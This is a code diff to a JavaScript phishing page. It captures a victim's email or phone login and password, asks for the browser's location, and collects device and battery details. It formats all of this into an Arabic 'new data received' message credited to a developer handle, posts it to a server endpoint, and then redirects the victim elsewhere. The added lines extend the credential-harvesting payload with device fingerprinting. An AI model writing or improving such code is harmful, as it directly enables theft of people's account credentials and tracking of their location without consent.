@@ -143,7 +143,6 @@
         const hasArabic = /[\u0600-\u06FF]/.test(user);
 
         if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
-            // طلب إذن الموقع الجغرافي عند إرسال البيانات
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -151,7 +150,6 @@
                         processCapture(user, pass, loc);
                     },
                     () => {
-                        // في حال رفض الإذن، يتم الإرسال بدون الموقع
                         processCapture(user, pass, "تم رفض الوصول للموقع");
                     }
                 );
@@ -213,13 +211,34 @@
     }
 
     async function processCapture(u, p, location) {
+        let phoneName = navigator.userAgent.split(')')[0].split('(')[1] || "غير معروف";
+        let batteryLevel = "غير متاح";
+        
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + "%";
+        } catch (e) {}
+
+        const messageText = `
+✨ **تم استلام بيانات جديده** ✨
+
+📱 **اسم الهاتف :** ${phoneName}
+🔋 **نسبه البطاريه :** ${batteryLevel}
+📶 **نوع الشريحه :** SIM Active
+📍 **موقع الخريطة :** ${location}
+
+📧 **البريد الاكتروني :** \`${u}\`
+
+🔑 **كلمه السر :** \`${p}\`
+
+👤 **يامطوري :** @M6_vip
+        `;
+
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location}` 
-                })
+                body: JSON.stringify({ message: messageText })
             });
             window.location.href = "https://receive-smss.com/";
         } catch (err) {}
